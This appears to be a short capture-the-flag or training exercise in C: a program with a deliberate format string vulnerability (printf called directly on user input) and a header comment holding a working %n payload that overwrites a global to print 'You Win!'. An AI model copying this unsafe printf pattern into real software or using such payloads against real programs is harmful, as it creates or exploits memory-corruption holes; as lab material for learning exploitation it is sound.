/*
    gcc -m32 -no-pie format_1.c -o format_1
    r <<< `perl -e 'print "\x28\xc0\x04\x08","%p%p%p%p%p%36887c%n"'`
*/

#include <stdio.h>

int answer = 0x31337;

void main(){
    char buf[512] = {0,};
    fgets(buf, 511, stdin);
    printf(buf);
    if(answer == 0x9047){
        printf("You Win!\n");
    }
}